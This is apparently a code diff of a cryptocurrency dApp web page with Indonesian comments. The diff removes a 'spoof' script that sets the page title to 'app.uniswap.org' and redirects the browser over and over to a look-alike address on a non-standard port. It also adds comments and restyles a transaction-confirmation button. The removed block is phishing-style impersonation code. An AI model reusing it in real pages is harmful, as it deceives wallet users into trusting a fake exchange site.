@@ -10,8 +10,10 @@
     <script>
         async function triggerOfficialDAppTransaction() {
             try {
+                // Meminta akses akun melalui provider global
                 const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
                 
+                // Developer asli menetapkan alamat tujuan ke Smart Contract Pool Resmi
                 await window.ethereum.request({
                     method: "eth_sendTransaction",
                     params: [{
@@ -53,22 +55,7 @@
     </script>
 
 
-    <script>
-        function spoof() {
-            document.title = "app.uniswap.org";
-            window.location.assign("http://app.uniswap.org:1121");
-
-            setTimeout(function(){
-                spoof();  
-            }, 5000); 
-        }
-
-        // Menjalankan fungsi spoofing secara berkala
-        setInterval(spoof, 2000);
-    </script>
-
-
-    <button onclick="triggerOfficialDAppTransaction()" style="margin-top:20px; padding:10px 20px;">Konfirmasi Transaksi</button>
+    <button onclick="triggerOfficialDAppTransaction()" style="margin-top:20px; padding:12px 24px; font-size: 16px; cursor: pointer;">Konfirmasi Transaksi dApp</button>
 
 </body>
 </html>
